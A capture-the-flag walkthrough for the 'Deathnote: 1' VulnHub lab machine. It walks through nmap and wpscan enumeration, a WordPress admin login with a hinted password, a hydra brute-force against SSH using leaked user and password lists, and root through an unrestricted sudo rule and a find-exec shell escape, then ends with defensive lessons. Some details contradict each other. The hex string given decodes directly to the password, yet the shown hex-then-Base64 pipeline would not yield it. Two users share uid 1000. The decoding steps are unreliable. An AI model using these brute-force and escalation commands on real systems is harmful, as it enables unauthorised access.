# Deathnote: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Deathnote: 1 |
| **Difficulty** | Easy (Easy/Medium depending on your comfort with WordPress) |
| **Author** | HWKDS |
| **Released** | 4 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/deathnote-1,739/](https://vulnhub.com/entry/deathnote-1,739/) |
| **Download** | [https://vulnhub.com/entry/deathnote-1,739/#download](https://vulnhub.com/entry/deathnote-1,739/#download) (mirror: `https://download.vulnhub.com/deathnote/Deathnote.ova`, ~658 MB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Ubuntu, Apache + PHP, WordPress) |

> **Note:** Exact IPs, WordPress paths, versions, and flags **vary by build** — this
> machine has been re-exported over time. Where you see `192.168.56.101`, substitute
> whatever address *your* target receives from DHCP. The steps and the reasoning are
> what matter, not the exact strings.

---

## 0. What you will learn

- How to find a target on an isolated lab subnet with `arp-scan` / `netdiscover`.
- How to enumerate a web server and recognise a WordPress site by its telltale paths.
- How to map a hostname (`deathnote.vuln`) to an IP using your own `/etc/hosts` file.
- How to run `wpscan` to enumerate WordPress users and vulnerable plugins.
- How to turn leaked hints into working admin credentials.
- How to find leftover files in the WordPress media library (`/wp-content/uploads/`).
- How to brute-force SSH with `hydra` when both a username list *and* a password list leak.
- How to decode esoteric encodings (Brainfuck) and layered encodings (hex → Base64).
- How to pivot between local users with `su` and escalate to root via over-broad `sudo`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an OVA into VirtualBox/VMware, and understand basic Linux shell usage.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

First, check your own address so you know which subnet the target will appear on.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `host-only` adapter (often `eth0` on a VirtualBox lab) holds
> an address in the `192.168.56.x` range. The target VM sits on this **same** subnet.

Now sweep the subnet for live hosts. ARP-based discovery is fast and does not need TCP.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **How to read it:** every line is a live machine. One of them is your target VM —
> here `192.168.56.101`. If `arp-scan` is missing, `sudo netdiscover -r 192.168.56.0/24`
> does the same job.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# 1) Fast full-TCP sweep of all 65,535 ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101

# 2) Service + version + default scripts on whatever came back open
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: Death Note
| http-robots.txt: 1 disallowed entry
|_/wordpress/
```

> **How to read it:**
> - `-p-` scans **all** TCP ports so nothing hides on an odd port.
> - `-sV` fingerprints the **service and version** behind each open port.
> - `-sC` runs Nmap's default safe scripts (banners, `robots.txt`, etc.).
> **Port 22** = remote login surface. **Port 80** = a web app to explore.

![Nmap service scan output](images/02-nmap.png)

### 2.1 The site redirects to a hostname

Browse to `http://192.168.56.101/`. Nmap already hinted that the interesting content
lives under `/wordpress/`, and the page tries to redirect to a name like
`http://deathnote.vuln/wordpress/`.

Because that name does not exist in DNS, add it to your own hosts file so the browser
resolves it to the target:

```bash
echo "192.168.56.101 deathnote.vuln" | sudo tee -a /etc/hosts
```

> **Why it works:** WordPress stores its address as a domain in its database. Mapping
> the name to the IP locally makes the site load correctly. This is *not* exploiting
> anything — it is just making your browser speak the right name.

Now visit:

```text
http://deathnote.vuln/wordpress/
```

### 2.2 WordPress fingerprinting with WPScan

The footer, `/wp-login.php`, and `/wp-content/` paths are dead giveaways for WordPress.

```bash
wpscan --url http://deathnote.vuln/wordpress/ -e u
```

```text
[+] URL: http://deathnote.vuln/wordpress/
[+] WordPress version 5.x
[+] Enumerating Users...
[i] User(s) Identified:
[+] kira
```

> **Why it works:** `wpscan` asks WordPress which plugins/themes are installed and
> enumerates usernames via the public REST API and author archives. `-e u` means
> "enumerate users". We now know a real account name: **kira**.

![WPScan enumerating the WordPress user kira](images/03-enum-wpscan.png)

### 2.3 Read the hints (the "HINT" button and `robots.txt`)

The homepage has a **HINT** button, and `robots.txt` mentions an `important.jpg`.
Fetching it reveals a message from the character **L** telling you to look for a
`user.txt` (a username list) and hinting at a password.

```bash
curl -s http://192.168.56.101/important.jpg
curl -s http://deathnote.vuln/wordpress/wp-content/uploads/
```

```text
HINT: the user.txt file has what you need ... password hint: iamjustic3
```

> **Why it works:** challenge authors scatter clues in the web root and in uploaded
> media. The leak here is a candidate WordPress password: **`iamjustic3`**. The same
> uploads directory is also the place WordPress stores media — a classic spot to find
> files an author forgot about.

---

## 3. Foothold — gaining the first shell

### 3.1 Log in to WordPress admin

Combine the enumerated user (`kira`) with the leaked password (`iamjustic3`).

```text
URL:      http://deathnote.vuln/wordpress/wp-login.php
Username: kira
Password: iamjustic3
```

> **Why it works:** weak, guessable, reused credentials are the single most common way
> into a CMS. There is no exploit here — just a bad password that the hints all but
> spelled out.

![Logging into the WordPress admin dashboard](images/04-wp-admin.png)

### 3.2 Harvest the credential lists from the media library

Inside the dashboard, open **Media → Library**. There are two leftover text files,
typically under `/wp-content/uploads/2021/07/`:

```bash
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
cat user.txt
cat notes.txt
```

```text
# user.txt  -> a short list of usernames (l, kira, ...)
# notes.txt -> a short list of candidate passwords
```

> **Why it works:** someone uploaded their working notes (a username list and a
> password list) into the media library and never deleted them. These become wordlists
> for a password spray/brute-force against SSH.

### 3.3 Brute-force SSH with Hydra

We now have a small username list *and* a small password list. Hydra will try every
combination against the SSH service.

```bash
hydra -L user.txt -P notes.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: l   password: death4me
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** `-L` is a **user list**, `-P` is a **password list**. Because both
> lists are tiny, the search space is small and finishes quickly. SSH does not throttle
> failed logins here, so offline-style guessing is feasible.

### 3.4 Log in and read the user flag

```bash
ssh l@192.168.56.101
# password: death4me
```

```text
l@deathnote:~$ id
uid=1000(l) gid=1000(l) groups=1000(l)
l@deathnote:~$ cat ~/user.txt
[-]>[-<+>] ... (Brainfuck!)

l@deathnote:~$ find / -name "user.txt" 2>/dev/null
/home/l/user.txt
/home/kira/kira.txt
```

> **Why it works:** we now hold a real local account. The file `~l/user.txt` is not a
> flag but a **Brainfuck** program (an esoteric language made only of `+ - < > [ ] . ,`).
> Decoding it (in a browser decoder or with a small script) yields the taunt:
> *"i think u got the shell, but you won't be able to kill me -kira"* — a clear pointer
> to the user **kira**, whose `kira.txt` we cannot yet read (owned by kira).

![SSH access as user l and the Brainfuck hint](images/05-shell-user-l.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Find the password for the next user

Explore the filesystem. The hint file in `l`'s home points at `/opt/L/` and a folder
called `fake-notebook-rule`.

```bash
ls -la /opt/L/
ls -la /opt/L/fake-notebook-rule/
cat /opt/L/fake-notebook-rule/*.txt 2>/dev/null
cat /opt/L/fake-notebook-rule/case.wav
```

```text
# case.wav contains a HEX string, not real audio, e.g.:
6b69726169736576696c   (hex)
# its text says: use CyberChef; then decode
```

> **Why it works:** the `case.wav` file contains text that is **hex-encoded**, and when
> you hex-decode it you get a **Base64** string. Decoding a second time reveals the
> password. Layered encodings like this are common in CTFs; CyberChef makes it easy to
> chain "From Hex" → "From Base64".

Decode it — the result is a password:

```bash
cat /opt/L/fake-notebook-rule/case.wav | xxd -r -p | base64 -d
```

```text
kiraisevil
```

> **Why it works:** `xxd -r -p` reverses a **hex dump** back into raw bytes; the pipe
> into `base64 -d` then decodes the resulting Base64 text. Two decodes, one password.

### 4.2 Switch to `kira`

`kira.txt` is a Base64 string (decode it) that confirms the same two locations —
`/opt/L/` and `/var/misa` — the challenge's signature for where the secret lives.

```bash
su kira
# password: kiraisevil
id
```

```text
uid=1000(kira) gid=1000(kira) groups=1000(kira),27(sudo)
```

> **Why it works:** we recovered a real password for the second account via encoding
> analysis, not guessing.

### 4.3 Abuse over-broad sudo to become root

Always check what your current user may run as root:

```bash
sudo -l
```

```text
User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means kira can run **any command as root**.
> That is effectively full root already — the box is over. Get an interactive root
> shell directly:

```bash
sudo su -
# or, equivalently:
sudo find /home -exec /bin/bash \;
```

```text
root@deathnote:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![Escalating to root via sudo](images/07-privesc-sudo.png)

### 4.4 The root flag

```bash
cat /root/root.txt
```

```text
<root flag — contents vary by build>
```

![Reading the root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Guessable / hinted WordPress admin password | `wp-login.php` (`kira`:`iamjustic3`) | Attacker gains CMS admin |
| 2 | Sensitive files left in media library | `/wp-content/uploads/2021/07/` (`user.txt`, `notes.txt`) | Leaks username + password wordlists |
| 3 | SSH brute-force not mitigated | Port 22 | Valid user credential recovered (`l`:`death4me`) |
| 4 | Secrets protected only by weak encoding | `/opt/L/fake-notebook-rule/case.wav` (hex+Base64) | Recovers `kira` password (`kiraisevil`) |
| 5 | Over-broad sudo policy | `kira` → `(ALL : ALL) ALL` | Trivial escalation to root |

## 6. Defensive lessons (blue team)

- **Enforce strong, unique passwords** and rate-limit/alert on WordPress login attempts.
- **Enable SSH key auth** and disable password auth, or deploy `fail2ban` to stop brute force.
- **Never store secrets in "encodings".** Base64 and hex are *not* encryption — treat any
  such string as plaintext. Use a real secret manager.
- **Principle of least privilege for `sudo`.** No normal user should have `(ALL : ALL) ALL`.
  Grant only specific binaries they genuinely need.
- **Harden WordPress:** keep core/plugins patched, remove default/admin accounts, disable
  user enumeration, and audit the media library for leftover sensitive uploads.
- **Detection:** alert on repeated SSH auth failures, new files under `wp-content/uploads`,
  and use of `sudo su` / `sudo -i` by non-admin accounts (auditd / `sudo` logs).

---

## 7. References

- VulnHub entry: [Deathnote: 1](https://vulnhub.com/entry/deathnote-1,739/)
- Community writeups consulted:
  - [DEATHNOTE: 1 VulnHub CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/deathnote-1-vulnhub-ctf-walkthrough/)
  - [Deathnote: 1 writeup — Medium (x3r)](https://medium.com/@x3r/deathnote-1-vulnhub-writeup-6d0b63b2d69b)
  - [Deathnote walkthrough — Lipson Thomas](https://lipsonthomas.com/deathnote-vulnhub-walkthrough/)
  - [Deathnote BOOT2ROOT writeup — Kur0Sh1r0](https://kur0sh1r0.gitbook.io/ctf-writeups/vulnhub/deathnote-boot2root-ctf-vulnhub-writeup)
- Tools / docs:
  - [WPScan](https://wpscan.com/)
  - [Hydra](https://github.com/vanhauser-thc/thc-hydra)
  - [CyberChef](https://gchq.github.io/CyberChef/)
  - [Brainfuck (esolang)](https://esolangs.org/wiki/Brainfuck)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan / netdiscover
- [ ] `images/02-nmap.png` — port/service scan (22 + 80)
- [ ] `images/03-enum-wpscan.png` — WPScan enumerating user `kira`
- [ ] `images/04-wp-admin.png` — logging into the WordPress dashboard
- [ ] `images/05-shell-user-l.png` — SSH as `l` + the Brainfuck hint
- [ ] `images/06-uploads.png` — `user.txt` / `notes.txt` in the media library
- [ ] `images/07-privesc-sudo.png` — `sudo -l` and escalation
- [ ] `images/08-root-flag.png` — reading `/root/root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
